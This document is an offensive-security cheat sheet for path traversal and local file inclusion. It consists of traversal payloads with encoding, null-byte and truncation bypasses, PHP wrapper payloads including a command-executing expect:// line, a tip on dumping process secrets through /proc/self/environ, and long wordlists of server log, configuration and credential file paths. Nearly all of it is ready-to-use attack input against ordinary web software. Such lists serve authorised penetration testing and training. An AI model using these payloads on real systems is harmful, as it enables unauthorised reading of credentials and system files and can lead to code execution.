***
- Identify a urls such as
	- `example.com/image?filename=img.jpg`
	- `example.com/getUserProfile.jsp?item=ikki.html`
	- `example.com/index.php?file=content`
	- `example.com/main.cgi?home=index.html`
- File Path traversal simple case: 
	- `../../../../etc/passwd`
- Traversal sequences blocked with absolute path bypass 
	- `/etc/passwd`
- Traversal sequences stripped non-recursively 
	- `....//....//....//etc/passwd`
	- `..././..././..././..././etc/passwd`
	- `....\/....\/....\/etc/passwd`
- Traversal sequences stripped with superfluous URL-decode and double encode
	- `..%252f..%252f..%252fetc/passwd
	- `%5c..%5c..%5c..%5cetc%5cpasswd`
	- `..%252f..%252f..%252fetc%252fpasswd`
	- `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`
	- `%252e%252e%252fetc%252fpasswd`
- Validation of start of path 
	- `/var/www/images/../../../etc/passwd`
- validation of file extension with null byte bypass
	- `../../../etc/passwd%00.png` 
	- `../../../etc/passwd%00`
	-  `%252e%252e%252fetc%252fpasswd%00`
- Path truncation:
	- `a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.`
	- `a/../../../../../../../../../etc/passwd/././.[ADD MORE]`
	- `a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.`
	- `a/../../../../[ADD MORE]../../../../../etc/passwd`
		*This vulnerability was corrected in PHP 5.3*
***
Interesting files to find on Linux system:
**OS Version**
```
/proc/version
```
**open TCP ports**
```
/proc/net/tcp
```
**open UDP ports**
```
/proc/net/udp
```
**can be used to retrieve running processes**
```
/proc/sched_debug
```
**Mounted devices**
```
/proc/mounts
```
**command line that triggered the running process**
```
/proc/[PID]/cmdline
```
**environment variables accessible to the process**
```
/proc/[PID]/environ
```
**current working directory of the process**
```
/proc/[PID]/cwd
```
**files opened by the process**
```
/proc/[PID]/fd/[n]
```
**ink to the executable file**
```
/proc/[PID]/exe
```

If we are trying to enumerate the running process Linux exposes the `self` keyword that can be used instead of a process id:

```
/proc/self/cmdline
```
```
/proc/self/environ
```
```
/proc/self/cwd
```
```
/proc/self/fd/[n]
```
```
/proc/self/exe
```

- Using a LFI with `/proc/[PID]/environ` we can leverage an attacker to dump secrets from running processes, including from the current web application.

## Leveraging protocols and wrappers
----
**simple filter bypass**
```
php://filter//etc/passwd`
```
**base64-encode**
```
php://filter/convert.base64-encode/resource=/etc/passwd
```
**zlib (compression)**
```
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```
**Expect has to be activated**
```
expect://id
```
## Possible log paths
----
Simple collection of paths:
```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

Spray and pray
- In some cases, a combination of attacks or bypasses is needed
- Don forget there is a couple path that require a change brute force is not the key  

**Apache Linux**
```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/apache2/logs/access.log
/apache2/logs/error.log
/apache/conf/httpd.conf
/apache/logs/access.log
/apache/logs/error.log
/apache/php/php.ini
/apache\php\php.ini
/etc/apache22/conf/httpd.conf
/etc/apache22/httpd.conf
/etc/apache2/apache2.conf
/etc/apache2/apache.conf
/etc/apache2/conf/httpd.conf
/etc/apache2/default-server.conf
/etc/apache2/envvars
/etc/apache2/httpd2.conf
/etc/apache2/httpd.conf
/etc/apache2/mods-available/autoindex.conf
/etc/apache2/mods-available/deflate.conf
/etc/apache2/mods-available/dir.conf
/etc/apache2/mods-available/mem_cache.conf
/etc/apache2/mods-available/mime.conf
/etc/apache2/mods-available/proxy.conf
/etc/apache2/mods-available/setenvif.conf
/etc/apache2/mods-available/ssl.conf
/etc/apache2/mods-enabled/alias.conf
/etc/apache2/mods-enabled/deflate.conf
/etc/apache2/mods-enabled/dir.conf
/etc/apache2/mods-enabled/mime.conf
/etc/apache2/mods-enabled/negotiation.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-enabled/status.conf
/etc/apache2/ports.conf
/etc/apache2/sites-available/default
/etc/apache2/sites-available/default-ssl
/etc/apache2/sites-enabled/000-default
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/default.conf
/etc/apache2/sites-enabled/default
/etc/apache2/sites-enabled/default-ssl.conf
/etc/apache2/sites-enabled/default-ssl
/etc/apache2/ssl-global.conf
/etc/apache/access.conf
/etc/apache/apache.conf
/etc/apache/conf/httpd.conf
/etc/apache/default-server.conf
/etc/apache/httpd.conf
/etc/httpd/apache2.conf
/etc/httpd/apache.conf
/etc/httpd/conf/apache2.conf
/etc/httpd/conf/apache.conf
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/squirrelmail/apache.conf
/home2/bin/stable/apache/php.ini
/home2\bin\stable\apache\php.ini
/home/bin/stable/apache/php.ini
/home\bin\stable\apache\php.ini
/NetServer/bin/stable/apache/php.ini
/NetServer\bin\stable\apache\php.ini
/opt/apache22/conf/httpd.conf
/opt/apache2/apache2.conf
/opt/apache2/apache.conf
/opt/apache2/conf/apache2.conf
/opt/apache2/conf/apache.conf
/opt/apache2/conf/httpd.conf
/opt/apache/apache2.conf
/opt/apache/apache.conf
/opt/apache/conf/apache2.conf
/opt/apache/conf/apache.conf
/opt/apache/conf/httpd.conf
/opt/httpd/apache2.conf
/opt/httpd/apache.conf
/opt/httpd/conf/apache2.conf
/opt/httpd/conf/apache.conf
/private/etc/httpd/apache2.conf
/private/etc/httpd/apache.conf
/usr/apache2/conf/httpd.conf
/usr/apache/conf/httpd.conf
/usr/home/user/var/log/apache.log
/usr/local/apache22/conf/httpd.conf
/usr/local/apache22/httpd.conf
/usr/local/apache2/apache2.conf
/usr/local/apache2/apache.conf
/usr/local/apache2/conf/apache2.conf
/usr/local/apache2/conf/apache.conf
/usr/local/apache2/conf/extra/httpd-ssl.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache2/conf/modsec.conf
/usr/local/apache2/conf/ssl.conf
/usr/local/apache2/conf/vhosts.conf
/usr/local/apache2/conf/vhosts-custom.conf
/usr/local/apache2/httpd.conf
/usr/local/apache2/logs/access.log
/usr/local/apache2/logs/access_log
/usr/local/apache2/logs/audit_log
/usr/local/apache2/logs/error.log
/usr/local/apache2/logs/error_log
/usr/local/apache2/logs/lighttpd.error.log
/usr/local/apache2/logs/lighttpd.log
/usr/local/apache/apache2.conf
/usr/local/apache/apache.conf
/usr/local/apache/conf/access.conf
/usr/local/apache/conf/apache2.conf
/usr/local/apache/conf/apache.conf
/usr/local/apache/conf/httpd.conf
/usr/local/apache/conf/httpd.conf.default
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/conf/vhosts.conf
/usr/local/apache/conf/vhosts-custom.conf
/usr/local/apache/httpd.conf
/usr/local/apache/logs/access.log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/audit_log
/usr/local/apache/logs/error.log
/usr/local/apache/logs/error_log
/usr/local/apache/logs/lighttpd.error.log
/usr/local/apache/logs/lighttpd.log
/usr/local/apache/logs/mod_jk.log
/usr/local/apps/apache22/conf/httpd.conf
/usr/local/apps/apache2/conf/httpd.conf
/usr/local/apps/apache/conf/httpd.conf
/usr/local/etc/apache22/conf/httpd.conf
/usr/local/etc/apache22/httpd.conf
/usr/local/etc/apache2/conf/httpd.conf
/usr/local/etc/apache2/httpd.conf
/usr/local/etc/apache2/vhosts.conf
/usr/local/etc/apache/conf/httpd.conf
/usr/local/etc/apache/httpd.conf
/usr/local/etc/apache/vhosts.conf
/usr/local/php4/apache2.conf
/usr/local/php4/apache2.conf.php
/usr/local/php4/apache.conf
/usr/local/php4/apache.conf.php
/usr/local/php5/apache2.conf
/usr/local/php5/apache2.conf.php
/usr/local/php5/apache.conf
/usr/local/php5/apache.conf.php
/usr/local/php/apache2.conf
/usr/local/php/apache2.conf.php
/usr/local/php/apache.conf
/usr/local/php/apache.conf.php
/var/apache/conf/httpd.conf
/var/log/apache2/access.log
/var/log/apache2/access_log
/var/log/apache2/error.log
/var/log/apache2/error_log
/var/log/apache2/squirrelmail.err.log
/var/log/apache2/squirrelmail.log
/var/log/apache/access.log
/var/log/apache/access_log
/var/log/apache/error.log
/var/log/apache/error_log
/www/apache/conf/httpd.conf
/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf
/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf
/Volumes/webBackup/opt/apache2/conf/httpd.conf
```

**Apache Windows**

```
/Program Files/Apache Group/Apache2/conf/apache2.conf
/Program Files/Apache Group/Apache2/conf/apache.conf
/Program Files/Apache Group/Apache/apache2.conf
/Program Files/Apache Group/Apache/apache.conf
/Program Files/Apache Group/Apache/conf/apache2.conf
/Program Files/Apache Group/Apache/conf/apache.conf
/Program Files/xampp/apache/conf/apache2.conf
/Program Files/xampp/apache/conf/apache.conf
/Program Files/xampp/apache/conf/httpd.conf
/Program Files\xampp\apache\conf\httpd.conf
```

**MySQL Linux**

```
/etc/mysql/my.cnf
/mysql/bin/my.ini
/MySQL/data/mysql-bin.index
/MySQL/data/mysql-bin.log
/MySQL/data/mysql.err
/MySQL/data/mysql.log
/usr/local/mysql/data/{HOST}.err
/usr/local/mysql/data/mysql-bin.index
/usr/local/mysql/data/mysql-bin.log
/usr/local/mysql/data/mysqlderror.log
/usr/local/mysql/data/mysql.err
/usr/local/mysql/data/mysql.log
/usr/local/mysql/data/mysql-slow.log
/var/data/mysql-bin.index
/var/lib/mysql/my.cnf
/var/log/data/mysql-bin.index
/var/log/mysql-bin.index
/var/log/mysql/data/mysql-bin.index
/var/log/mysqlderror.log
/var/log/mysql.err
/var/log/mysql.log
/var/log/mysql/mysql-bin.index
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/mysql-bin.index
/var/mysql.log
```

**Apache Windows**

```
/Program Files/MySQL/data/mysql-bin.index
/Program Files/MySQL/data/mysql-bin.log
/Program Files/MySQL/data/mysql.err
/Program Files/MySQL/data/mysql.log
```

**WordPress**

```
/var/www/html/wp-config.php
/var/www/html/wordpress/wp-config.php
/var/www/html/wp/wp-config.php
```

**Xampp**

```
/opt/xampp/etc/php.ini
/opt/xampp/logs/access.log
/opt/xampp/logs/access_log
/opt/xampp/logs/error.log
/opt/xampp/logs/error_log
/xampp/FileZillaFTP/FileZilla Server.xml
/xampp/htdocs/aca.txt
/xampp/htdocs/admin.php
/xampp/htdocs/leer.txt
/xampp/MercuryMail/mercury.ini
/xampp/phpMyAdmin/config.inc.php
/xampp/php/php.ini
/xampp/sendmail/sendmail.ini
/xampp/sendmail/sendmail.log
/xampp/webalizer/webalizer.conf
```

**Jboss Linux**

```
/[JBOSS]/server/default/conf/jboss-minimal.xml
/[JBOSS]/server/default/conf/jboss-service.xml
/[JBOSS]/server/default/conf/jndi.properties
/[JBOSS]/server/default/conf/log4j.xml
/[JBOSS]/server/default/conf/login-config.xml
/[JBOSS]/server/default/conf/server.log.properties
/[JBOSS]/server/default/conf/standardjaws.xml
/[JBOSS]/server/default/conf/standardjboss.xml
/[JBOSS]/server/default/deploy/jboss-logging.xml
/[JBOSS]/server/default/log/boot.log
/[JBOSS]/server/default/log/server.log
/opt/[JBOSS]/server/default/conf/jboss-minimal.xml
/opt/[JBOSS]/server/default/conf/jboss-service.xml
/opt/[JBOSS]/server/default/conf/jndi.properties
/opt/[JBOSS]/server/default/conf/log4j.xml
/opt/[JBOSS]/server/default/conf/login-config.xml
/opt/[JBOSS]/server/default/conf/server.log.properties
/opt/[JBOSS]/server/default/conf/standardjaws.xml
/opt/[JBOSS]/server/default/conf/standardjboss.xml
/opt/[JBOSS]/server/default/deploy/jboss-logging.xml
/opt/[JBOSS]/server/default/log/boot.log
/opt/[JBOSS]/server/default/log/server.log
/private/tmp/[JBOSS]/server/default/conf/jboss-minimal.xml
/private/tmp/[JBOSS]/server/default/conf/jboss-service.xml
/private/tmp/[JBOSS]/server/default/conf/jndi.properties
/private/tmp/[JBOSS]/server/default/conf/log4j.xml
/private/tmp/[JBOSS]/server/default/conf/login-config.xml
/private/tmp/[JBOSS]/server/default/conf/server.log.properties
/private/tmp/[JBOSS]/server/default/conf/standardjaws.xml
/private/tmp/[JBOSS]/server/default/conf/standardjboss.xml
/private/tmp/[JBOSS]/server/default/deploy/jboss-logging.xml
/private/tmp/[JBOSS]/server/default/log/boot.log
/private/tmp/[JBOSS]/server/default/log/server.log
/tmp/[JBOSS]/server/default/conf/jboss-minimal.xml
/tmp/[JBOSS]/server/default/conf/jboss-service.xml
/tmp/[JBOSS]/server/default/conf/jndi.properties
/tmp/[JBOSS]/server/default/conf/log4j.xml
/tmp/[JBOSS]/server/default/conf/login-config.xml
/tmp/[JBOSS]/server/default/conf/server.log.properties
/tmp/[JBOSS]/server/default/conf/standardjaws.xml
/tmp/[JBOSS]/server/default/conf/standardjboss.xml
/tmp/[JBOSS]/server/default/deploy/jboss-logging.xml
/tmp/[JBOSS]/server/default/log/boot.log
/tmp/[JBOSS]/server/default/log/server.log
/usr/local/[JBOSS]/server/default/conf/jboss-minimal.xml
/usr/local/[JBOSS]/server/default/conf/jboss-service.xml
/usr/local/[JBOSS]/server/default/conf/jndi.properties
/usr/local/[JBOSS]/server/default/conf/log4j.xml
/usr/local/[JBOSS]/server/default/conf/login-config.xml
/usr/local/[JBOSS]/server/default/conf/server.log.properties
/usr/local/[JBOSS]/server/default/conf/standardjaws.xml
/usr/local/[JBOSS]/server/default/conf/standardjboss.xml
/usr/local/[JBOSS]/server/default/deploy/jboss-logging.xml
/usr/local/[JBOSS]/server/default/log/boot.log
/usr/local/[JBOSS]/server/default/log/server.log
```

**Macintosh**

```
/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf
/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php
/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php
/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
```

**Various Windows**

```
/WINDOWS/php.ini
/WINDOWS\php.ini
/WINDOWS/system32/logfiles/MSFTPSVC
/WINDOWS/system32/logfiles/MSFTPSVC1
/WINDOWS/system32/logfiles/MSFTPSVC2
/WINDOWS/system32/logfiles/SMTPSVC
/WINDOWS/system32/logfiles/SMTPSVC1
/WINDOWS/system32/logfiles/SMTPSVC2
/WINDOWS/system32/logfiles/SMTPSVC3
/WINDOWS/system32/logfiles/SMTPSVC4
/WINDOWS/system32/logfiles/SMTPSVC5
/WINDOWS/system32/logfiles/W3SVC1/inetsvn1.log
/WINDOWS/system32/logfiles/W3SVC2/inetsvn1.log
/WINDOWS/system32/logfiles/W3SVC3/inetsvn1.log
/WINDOWS/system32/logfiles/W3SVC/inetsvn1.log
/WINNT/php.ini
/WINNT\php.ini
/WINNT/system32/logfiles/MSFTPSVC
/WINNT/system32/logfiles/MSFTPSVC1
/WINNT/system32/logfiles/MSFTPSVC2
/WINNT/system32/logfiles/SMTPSVC
/WINNT/system32/logfiles/SMTPSVC1
/WINNT/system32/logfiles/SMTPSVC2
/WINNT/system32/logfiles/SMTPSVC3
/WINNT/system32/logfiles/SMTPSVC4
/WINNT/system32/logfiles/SMTPSVC5
/WINNT/system32/logfiles/W3SVC1/inetsvn1.log
/WINNT/system32/logfiles/W3SVC2/inetsvn1.log
/WINNT/system32/logfiles/W3SVC3/inetsvn1.log
/WINNT/system32/logfiles/W3SVC/inetsvn1.log
/Program Files/Apache Group/Apache2/conf/httpd.conf
/Program Files\Apache Group\Apache2\conf\httpd.conf
/Program Files/Apache Group/Apache/conf/httpd.conf
/Program Files\Apache Group\Apache\conf\httpd.conf
/Program Files/Apache Group/Apache/logs/access.log
/Program Files\Apache Group\Apache\logs\access.log
/Program Files/Apache Group/Apache/logs/error.log
/Program Files\Apache Group\Apache\logs\error.log
/Program Files/[JBOSS]/server/default/conf/jboss-minimal.xml
/Program Files/[JBOSS]/server/default/conf/jboss-service.xml
/Program Files/[JBOSS]/server/default/conf/jndi.properties
/Program Files/[JBOSS]/server/default/conf/log4j.xml
/Program Files/[JBOSS]/server/default/conf/login-config.xml
/Program Files/[JBOSS]/server/default/conf/server.log.properties
/Program Files/[JBOSS]/server/default/conf/standardjaws.xml
/Program Files/[JBOSS]/server/default/conf/standardjboss.xml
/Program Files/[JBOSS]/server/default/deploy/jboss-logging.xml
/Program Files/[JBOSS]/server/default/log/boot.log
/Program Files/[JBOSS]/server/default/log/server.log
/Program Files/MySQL/data/{HOST}.err
/Program Files/MySQL/my.cnf
/Program Files/MySQL/my.ini
/Program Files/Vidalia Bundle/Polipo/polipo.conf
```

**Nginx**

```
/var/log/nginx/access.log
/var/log/nginx/error.log
/etc/nginx/nginx.conf
/usr/local/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
/var/log/nginx.access_log
/var/log/nginx/access.log
/var/log/nginx/access_log
/var/log/nginx.error_log
/var/log/nginx/error.log
/var/log/nginx/error_log
```

**Postgresql**

```
/etc/postgresql/pg_hba.conf
/etc/postgresql/postgresql.conf
/home/postgres/data/pg_hba.conf
/home/postgres/data/pg_ident.conf
/home/postgres/data/PG_VERSION
/home/postgres/data/postgresql.conf
/usr/internet/pgsql/data/postmaster.log
/usr/local/pgsql/data/postgresql.conf
/usr/local/pgsql/data/postgresql.log
/var/lib/pgsql/data/postgresql.conf
/var/log/cron/var/log/postgres.log
/var/log/postgres/pg_backup.log
/var/log/postgres/postgres.log
/var/log/postgresql.log
/var/log/postgresql/main.log
/var/log/postgresql/postgres.log
/var/log/postgresql/postgresql-8.1-main.log
/var/log/postgresql/postgresql-8.3-main.log
/var/log/postgresql/postgresql-8.4-main.log
/var/log/postgresql/postgresql-9.0-main.log
/var/log/postgresql/postgresql-9.1-main.log
/var/log/postgresql/postgresql.log
/var/nm2/postgresql.conf
/var/postgresql/db/postgresql.conf
/var/postgresql/log/postgresql.log
/usr/internet/pgsql/data/pg_hba.conf
/usr/internet/pgsql/data/postmaster.log
/usr/local/pgsql/bin/pg_passwd
/usr/local/pgsql/data/passwd
/usr/local/pgsql/data/pg_hba.conf
/usr/local/pgsql/data/pg_log
/usr/local/pgsql/data/postgresql.conf
/usr/local/pgsql/data/postgresql.log
/var/lib/pgsql/data/postgresql.conf
/var/log/pgsql8.log
/var/log/pgsql_log
/var/log/pgsql/pgsql.log
```

**Logs**

```
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
/etc/httpd/logs/acces.log
/etc/httpd/logs/acces_log
/etc/httpd/logs/access.log
/etc/httpd/logs/access_log
/etc/httpd/logs/error.log
/etc/httpd/logs/error_log
/etc/login.defs
/etc/logrotate.conf
/etc/muddleftpd/mudlog
/etc/muddleftpd/mudlogd.conf
/etc/samba/netlogon
/etc/security/failedlogin
/etc/security/lastlog
/etc/syslog.conf
/logs/access.log
/logs/access_log
/logs/error.log
/logs/error_log
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/logs/access.log
/opt/lampp/logs/access_log
/opt/lampp/logs/error.log
/opt/lampp/logs/error_log
/opt/lsws/logs/access.log
/opt/lsws/logs/error.log
/opt/tomcat/logs/catalina.err
/opt/tomcat/logs/catalina.out
/root/.bash_logout
/tmp/access.log
/usr/home/user/var/log/lighttpd.error.log
/usr/internet/pgsql/data/postmaster.log
/usr/lib/cron/log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/jakarta/dist/tomcat/conf/logging.properties
/usr/local/jakarta/dist/tomcat/logs/mod_jk.log
/usr/local/jakarta/tomcat/conf/logging.properties
/usr/local/jakarta/tomcat/logs/catalina.err
/usr/local/jakarta/tomcat/logs/catalina.out
/usr/local/jakarta/tomcat/logs/mod_jk.log
/usr/local/lighttpd/log/access.log
/usr/local/lighttpd/log/lighttpd.error.log
/usr/local/logs/access.log
/usr/local/logs/samba.log
/usr/local/lsws/logs/error.log
/usr/local/pgsql/data/pg_log
/usr/local/pgsql/data/postgresql.log
/usr/local/psa/admin/logs/httpsd_access_log
/usr/local/psa/admin/logs/panel.log
/usr/local/samba/lib/log.user
/usr/local/zeus/web/log/errors
/usr/sbin/mudlogd
/usr/share/logs/catalina.err
/usr/share/logs/catalina.out
/usr/share/squirrelmail/plugins/squirrel_logger/setup.php
/usr/share/tomcat6/conf/logging.properties
/usr/share/tomcat6/logs/catalina.err
/usr/share/tomcat6/logs/catalina.out
/usr/share/tomcat/logs/catalina.err
/usr/share/tomcat/logs/catalina.out
/usr/spool/lp/log
/usr/spool/mqueue/syslog
/var/adm/acct/sum/loginlog
/var/adm/aculog
/var/adm/aculogs
/var/adm/cron/log
/var/adm/lastlog/username
/var/adm/log/asppp.log
/var/adm/loginlog
/var/adm/log/xferlog
/var/adm/ras/bootlog
/var/adm/ras/errlog
/var/adm/sulog
/var/adm/vold.log
/var/cron/log
/var/lib/squirrelmail/prefs/squirrelmail.log
/var/lighttpd.log
/var/log/access.log
/var/log/access_log
/var/log/auth.log
/var/log/authlog
/var/log/boot.log
/var/log/cron/var/log/postgres.log
/var/log/daemon.log
/var/log/daemon.log.1
/var/log/dmessage
/var/log/error.log
/var/log/error_log
/var/log/exim/mainlog
/var/log/exim_mainlog
/var/log/exim/paniclog
/var/log/exim_paniclog
/var/log/exim/rejectlog
/var/log/exim_rejectlog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access.log
/var/log/httpd/access_log
/var/log/httpd/error.log
/var/log/httpd/error_log
/var/log/ipfw
/var/log/ipfw/ipfw.log
/var/log/ipfw.log
/var/log/ipfw.today
/var/log/kern.log
/var/log/kern.log.1
/var/log/lighttpd/
/var/log/lighttpd.access.log
/var/log/lighttpd/access.log
/var/log/lighttpd/access.www.log
/var/log/lighttpd/{DOMAIN}/access.log
/var/log/lighttpd/{DOMAIN}/error.log
/var/log/lighttpd.error.log
/var/log/lighttpd/error.log
/var/log/lighttpd/error.www.log
/var/log/log.smb
/var/log/mail.err
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/messages
/var/log/messages.1
/var/log/muddleftpd
/var/log/muddleftpd.conf
/var/log/news.all
/var/log/news/news.all
/var/log/news/news.crit
/var/log/news/news.err
/var/log/news/news.notice
/var/log/news/suck.err
/var/log/news/suck.notice
/var/log/nginx.access_log
/var/log/nginx/access.log
/var/log/nginx/access_log
/var/log/nginx.error_log
/var/log/nginx/error.log
/var/log/nginx/error_log
/var/log/pgsql8.log
/var/log/pgsql_log
/var/log/pgsql/pgsql.log
/var/log/pm-powersave.log
/var/log/POPlog
/var/log/postgres/pg_backup.log
/var/log/postgres/postgres.log
/var/log/postgresql.log
/var/log/postgresql/main.log
/var/log/postgresql/postgres.log
/var/log/postgresql/postgresql-8.1-main.log
/var/log/postgresql/postgresql-8.3-main.log
/var/log/postgresql/postgresql-8.4-main.log
/var/log/postgresql/postgresql-9.0-main.log
/var/log/postgresql/postgresql-9.1-main.log
/var/log/postgresql/postgresql.log
/var/log/proftpd
/var/log/proftpd.access_log
/var/log/proftpd.xferlog
/var/log/proftpd/xferlog.legacy
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/logs/access.log
/var/log/samba.log
/var/log/samba.log1
/var/log/samba.log2
/var/log/samba/log.nmbd
/var/log/samba/log.smbd
/var/log/squirrelmail.log
/var/log/sso/sso.log
/var/log/sw-cp-server/error_log
/var/log/syslog
/var/log/syslog.1
/var/log/tomcat6/catalina.out
/var/log/ufw.log
/var/log/user.log
/var/log/user.log.1
/var/log/vmware/hostd-1.log
/var/log/vmware/hostd.log
/var/log/vsftpd.log
/var/log/webmin/miniserv.log
/var/log/xferlog
/var/log/Xorg.0.log
/var/lp/logs/lpNet
/var/lp/logs/lpsched
/var/lp/logs/requests
/var/postgresql/log/postgresql.log
/var/saf/_log
/var/saf/port/log
/var/www/logs/access.log
/var/www/logs/access_log
/var/www/logs/error.log
/var/www/logs/error_log
/www/logs/freebsddiary-access_log
/www/logs/freebsddiary-error.log
/www/logs/proftpd.system.log
/wamp/logs/access.log
/wamp/logs/genquery.log
/wamp/logs/slowquery.log
```

**Config files**

```
/etc/adduser.conf
/etc/apt/apt.conf
/etc/avahi/avahi-daemon.conf
/etc/bluetooth/input.conf
/etc/bluetooth/main.conf
/etc/bluetooth/network.conf
/etc/bluetooth/rfcomm.conf
/etc/ca-certificates.conf
/etc/ca-certificates.conf.dpkg-old
/etc/casper.conf
/etc/chkrootkit.conf
/etc/clamav/clamd.conf
/etc/clamav/freshclam.conf
/etc/cups/acroread.conf
/etc/cups/cupsd.conf
/etc/cups/cupsd.conf.default
/etc/cups/pdftops.conf
/etc/cups/printers.conf
/etc/cvs-cron.conf
/etc/cvs-pserver.conf
/etc/debconf.conf
/etc/deluser.conf
/etc/dhcp3/dhclient.conf
/etc/dhcp3/dhcpd.conf
/etc/dhcp/dhclient.conf
/etc/dns2tcpd.conf
/etc/e2fsck.conf
/etc/esound/esd.conf
/etc/etter.conf
/etc/foremost.conf
/etc/fuse.conf
/etc/hdparm.conf
/etc/host.conf
/etc/http/conf/httpd.conf
/etc/httpd.conf
/etc/httpd/conf
/etc/httpd/conf.d
/etc/httpd/conf/httpd.conf
/etc/httpd/extra/httpd-ssl.conf
/etc/httpd/httpd.conf
/etc/httpd/mod_php.conf
/etc/http/httpd.conf
/etc/inetd.conf
/etc/ipfw.conf
/etc/kbd/config
/etc/kernel-img.conf
/etc/kernel-pkg.conf
/etc/ldap/ldap.conf
/etc/ld.so.conf
/etc/lighttpd/lighthttpd.conf
/etc/logrotate.conf
/etc/ltrace.conf
/etc/mail/sendmail.conf
/etc/manpath.config
/etc/miredo.conf
/etc/miredo/miredo.conf
/etc/miredo/miredo-server.conf
/etc/miredo-server.conf
/etc/mono/config
/etc/mtools.conf
/etc/muddleftpd/muddleftpd.conf
/etc/muddleftpd/mudlogd.conf
/etc/nginx/nginx.conf
/etc/openldap/ldap.conf
/etc/osxhttpd/osxhttpd.conf
/etc/pam.conf
/etc/phpmyadmin/config.inc.php
/etc/postgresql/pg_hba.conf
/etc/postgresql/postgresql.conf
/etc/proftp.conf
/etc/proftpd/modules.conf
/etc/protpd/proftpd.conf
/etc/pulse/client.conf
/etc/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.conf
/etc/rc.conf
/etc/resolv.conf
/etc/samba/dhcp.conf
/etc/samba/samba.conf
/etc/samba/smb.conf
/etc/samba/smb.conf.user
/etc/security/access.conf
/etc/security/group.conf
/etc/security/limits.conf
/etc/security/namespace.conf
/etc/security/pam_env.conf
/etc/security/sepermit.conf
/etc/security/time.conf
/etc/sensors3.conf
/etc/sensors.conf
/etc/smb.conf
/etc/smi.conf
/etc/squirrelmail/config/config.php
/etc/squirrelmail/config_default.php
/etc/squirrelmail/config_local.php
/etc/squirrelmail/config.php
/etc/squirrelmail/sqspell_config.php
/etc/ssh/sshd_config
/etc/sso/sso_config.ini
/etc/stunnel/stunnel.conf
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/sysctl.conf
/etc/syslog.conf
/etc/tinyproxy/tinyproxy.conf
/etc/tor/tor-tsocks.conf
/etc/tsocks.conf
/etc/updatedb.conf
/etc/updatedb.conf.BeforeVMwareToolsInstall
/etc/vhcs2/proftpd/proftpd.conf
/etc/vmware-tools/config
/etc/vmware-tools/tpvmlp.conf
/etc/vmware-tools/vmware-tools-libraries.conf
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/webmin/miniserv.conf
/etc/wicd/dhclient.conf.template.default
/etc/wicd/manager-settings.conf
/etc/wicd/wired-settings.conf
/etc/wicd/wireless-settings.conf
/etc/X11/xorg.conf
/etc/X11/xorg.conf.BeforeVMwareToolsInstall
/etc/X11/xorg.conf.orig
/etc/X11/xorg.conf-vesa
/etc/X11/xorg.conf-vmware
/home/postgres/data/pg_hba.conf
/home/postgres/data/pg_ident.conf
/home/postgres/data/postgresql.conf
/home/user/lighttpd/lighttpd.conf
/http/httpd.conf
/opt/lampp/etc/httpd.conf
/opt/lsws/conf/httpd_conf.xml
/private/etc/httpd/httpd.conf
/private/etc/httpd/httpd.conf.default
/private/etc/squirrelmail/config/config.php
/root/.bash_config
/srv/www/htdos/squirrelmail/config/config.php
/usr/etc/pure-ftpd.conf
/usr/home/user/lighttpd/lighttpd.conf
/usr/internet/pgsql/data/pg_hba.conf
/usr/local/etc/httpd/conf
/usr/local/etc/httpd/conf/httpd.conf
/usr/local/etc/lighttpd.conf
/usr/local/etc/lighttpd.conf.new
/usr/local/etc/nginx/nginx.conf
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/smb.conf
/usr/local/etc/webmin/miniserv.conf
/usr/local/httpd/conf/httpd.conf
/usr/local/jakarta/dist/tomcat/conf/context.xml
/usr/local/jakarta/dist/tomcat/conf/jakarta.conf
/usr/local/jakarta/dist/tomcat/conf/logging.properties
/usr/local/jakarta/dist/tomcat/conf/server.xml
/usr/local/jakarta/dist/tomcat/conf/workers.properties
/usr/local/jakarta/tomcat/conf/context.xml
/usr/local/jakarta/tomcat/conf/jakarta.conf
/usr/local/jakarta/tomcat/conf/logging.properties
/usr/local/jakarta/tomcat/conf/server.xml
